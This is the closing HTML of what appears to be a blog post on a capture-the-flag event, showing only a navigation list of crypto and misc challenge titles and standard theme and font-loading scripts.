        <li><a href="#萌新素数">[萌新]素数</a></li>
        <li><a href="#签到键盘侠">[签到]键盘侠</a></li>
        <li><a href="#silent_peeper">silent_peeper</a></li>
        <li><a href="#ezdes">EzDES</a></li>
      </ul>
    </li>
    <li><a href="#misc">Misc</a>
      <ul>
        <li><a href="#萌新在哪儿呢">[萌新]在哪儿呢</a></li>
        <li><a href="#签到签到">[签到]签到</a></li>
        <li><a href="#只是个png别想太多了png">只是个PNG，别想太多了.png</a></li>
        <li><a href="#压缩包压缩包压缩包压缩包">压缩包压缩包压缩包压缩包</a></li>
        <li><a href="#range_download">range_download</a></li>
      </ul>
    </li>
  </ul>
</nav>
                </div>
            </section>
        </aside>
    

        </div>
        <script 
                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js"integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g="crossorigin="anonymous"
                defer="false"
                >
            </script><script type="text/javascript" src="/ts/main.js" defer></script>
<script>
    (function () {
        const customFont = document.createElement('link');
        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";

        customFont.type = "text/css";
        customFont.rel = "stylesheet";

        document.head.appendChild(customFont);
    }());
</script>

    </body>
</html>
